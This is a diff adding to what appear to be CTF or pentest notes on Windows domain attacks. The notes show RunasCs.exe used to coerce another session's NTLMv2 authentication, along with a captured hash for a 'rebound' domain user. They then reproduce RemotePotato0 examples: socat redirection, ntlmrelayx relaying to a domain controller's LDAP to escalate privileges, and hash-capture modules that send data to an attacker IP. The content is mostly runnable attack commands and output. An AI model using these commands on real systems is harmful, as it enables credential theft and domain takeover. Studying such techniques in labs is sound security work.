@@ -1,3 +1,8 @@
+
+> [!Attention] 
+> `qwinsta` won't work properly if you used winrm, because its disabled from registry to be used in remote management and it will show no sessions even though there are sessions running already. Its only accessible from local connections, thats why we are using RunasCs.exe to trick windows to think we are in local connection. 
+
+
 If you saw another user that having a session on the computer right now  with you `qwinsta`, use this to coarce NTMLv2. THIS WORK EVEN IF NTLMv2 disabled.
 ```powershell
 *Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x qwinsta -l 9
@@ -35,4 +40,47 @@ NTLMv2 Client   : DC01
 NTLMv2 Username : rebound\tbrady
 NTLMv2 Hash     : tbrady::rebound:2c38764642ea2aeb:216c7642dd3e5224eed40910c4aff73f:010100000000
 
+```
+
+## Examples[](https://github.com/antonioCoco/RemotePotato0#examples)
+
+Attacker machine (10.0.0.20)
+Victim machine (10.0.0.45)
+Victim Domain Controller (10.0.0.10)
+
+#### Module 0 - Rpc2Http cross protocol relay server + potato trigger
+```
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.45:9999 &
+sudo ntlmrelayx.py -t ldap://10.0.0.10 --no-wcf-server --escalate-user normal_user
+```
+
+**Note: if you are on Windows Server <= 2016 you can avoid the network redirector (socat) because the oxid resolution can be performed locally.**
+
+```
+query user
+.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
+```
+
+#### Module 1 - Rpc2Http cross protocol relay server
+```
+.\RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20 
+```
+
+```
+rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
+```
+
+#### Module 2 - Rpc capture (hash) server + potato trigger
+```
+query user
+.\RemotePotato0.exe -m 2 -s 1 -x <AttackerIP> -p 9999
+```
+
+#### Module 3 - Rpc capture (hash) server
+```
+.\RemotePotato0.exe -m 3 -l 9997
+```
+
+```
+rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
 ```
